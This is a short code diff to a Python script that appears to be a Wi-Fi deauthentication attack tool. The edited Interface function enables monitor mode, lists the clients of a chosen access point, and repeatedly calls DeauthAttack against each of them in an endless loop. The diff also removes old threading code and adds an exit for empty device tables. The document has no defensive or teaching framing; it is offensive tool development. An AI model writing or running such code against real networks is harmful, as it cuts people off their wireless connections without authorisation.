@@ -127,7 +127,7 @@ def Interface():
 	'''
 	#workers = []
 	try:
-		Welcome()
+		#Welcome()
 		interface = Device_Interface()
 		MonitorMode(interface)
 
@@ -148,31 +148,18 @@ def Interface():
 					break
 			
 			Display_Clients(device_target)
-			#client_target = raw_input("\nPlease choose Client MAC Address (For example: 00:18:25:16:72:b0):")
-			#if(client_target == "exit" or choise == "quit"):
-			#	Exit()
-			#if(client_target not in clients.keys()):
-			#	print("Bad Device MAC Address")
-			#else:
+			
 			while(1):
 				for client in clients:
 					if(clients[client] == devices[device_target]):
 						print(client + " : " + device_target)
-						#t = threading.Thread(target=DeauthAttack, args = (interface, device_target, client))
-						#workers.append(t)
-						#t.daemon = True
 						DeauthAttack(interface, device_target, client)
-		
-		#for worker in workers:
-		#	worker.start()
-		#while(True):
-		#	time.sleep(100)
+		else:
+			print("\nDevices or Clients table is null\n")
+			Exit()
 
 	except KeyboardInterrupt:	
 		print ("\nInterruption detected.\n")
-		#for worker in workers:
-			#worker.kill()
-		#	worker.join(10)	
 		exit()
 
 if __name__ == '__main__':
